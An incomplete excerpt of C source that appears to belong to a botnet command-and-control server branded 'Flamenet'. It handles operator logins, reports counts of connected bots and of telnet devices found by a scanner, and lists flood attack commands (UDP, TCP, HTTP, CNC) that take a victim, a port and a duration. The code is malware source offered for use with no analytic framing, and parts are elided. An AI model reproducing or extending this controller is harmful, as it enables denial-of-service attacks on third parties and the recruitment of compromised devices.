...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        if(send(datafd, "\x1b[91mUsername: \x1b[97m ", 22, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(datafd, "\x1b[33mPassword: \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		...
		sprintf(failed_line1, "\x1b[91mSlamming Your Shit\r\n");
		...
		sprintf(ascii_banner_line1, "\x1b[91m                          ╔═╗╦  ╔═╗╔╦╗╔═╗╔╗╔╔═╗╔╦╗ \r\n");
		sprintf(ascii_banner_line2, "\x1b[91m                          ╠╣ ║  ╠═╣║║║║╣ ║║║║╣  ║  \r\n");
		sprintf(ascii_banner_line3, "\x1b[93m                          ╚  ╩═╝╩ ╩╩ ╩╚═╝╝╚╝╚═╝ ╩  \r\n");
		sprintf(ascii_banner_line5, "\r\n");	
		sprintf(banner_bot_count,   "\r\n\x1b[97m                   [+] \x1b[91mWelcome to the Flamenet, \e[93m%s \x1b[97m [+]\r\n", accounts[find_line].username);
		...
		if(send(datafd, "\x1b[97mFlame: ", 12, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			if(strstr(buf, "BOTS")) {
				...
				sprintf(botcount, "[+] - Bots: [\x1b[97m %d \x1b[97m] [+] - Users: [\x1b[97m %d \x1b[97m]\r\n", BotsConnected(), OperatorsConnected);
			...
			if(strstr(buf, "STATUS")){
				...
				sprintf(statuscount, "[+] - Devices: [\x1b[97m %d \x1b[97m] [+] - Status: [\x1b[97m %d \x1b[97m]\r\n", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
								if(send(datafd, "\x1b[97m%Flame: ", 12, MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				...
				sprintf(helpline1,  "   \r\n\x1b[97m#--- \x1b[93mCOMMANDS \x1b[97m---#\r\n\r\n");
				sprintf(helpline2,  "   \x1b[97m- UDP - \x1b[91m!* UDP Victim Port Time 32 0 10\r\n");
				sprintf(helpline3,  "   \x1b[97m- TCP - \x1b[91m!* TCP Victim Port Time 32 all 0 10\r\n");
				sprintf(helpline4,  "   \x1b[97m- HTTP - \x1b[91m!* HTTP Url Time\r\n");
				sprintf(helpline5,  "   \x1b[97m- CNC - \x1b[91m!* CNC IP PORT TIME\r\n");
				sprintf(helpline7,  "   \x1b[97m- Kills Attack - \x1b[91mKILL\r\n");
				sprintf(helpline9,  "   \x1b[97m- Bot Count - \x1b[91mBOTS\r\n");
				sprintf(helpline11, "   \x1b[97m- Clear Screen - \x1b[91mCLEAR\r\n");
				sprintf(helpline12, "   \x1b[97m- LOGOUT - \x1b[91mLOGOUT\r\n");
				sprintf(helpline13, "   \r\n");
				...
				sprintf(ls1,  "   \r\n\x1b[97m#--- \x1b[93mMETHODS \x1b[97m---#\r\n\r\n");
				sprintf(ls2,  "   \x1b[97m- UDP - \x1b[91m!* UDP Victim Port Time 32 0 10\r\n");
				sprintf(ls3,  "   \x1b[97m- TCP - \x1b[91m!* TCP Victim Port Time 32 all 0 10\r\n");
				sprintf(ls4,  "   \x1b[97m- HTTP - \x1b[91m!* HTTP Url Time\r\n");
				sprintf(ls5,  "   \x1b[97m- CNC - \x1b[91m!* CNC IP PORT TIME\r\n"); 
			...
			if(strstr(buf, "LOGOUT")) {
                ...
                trim(buf);
                if(send(datafd, "\x1b[97mFlame: ", 11, MSG_NOSIGNAL) == -1) goto end;
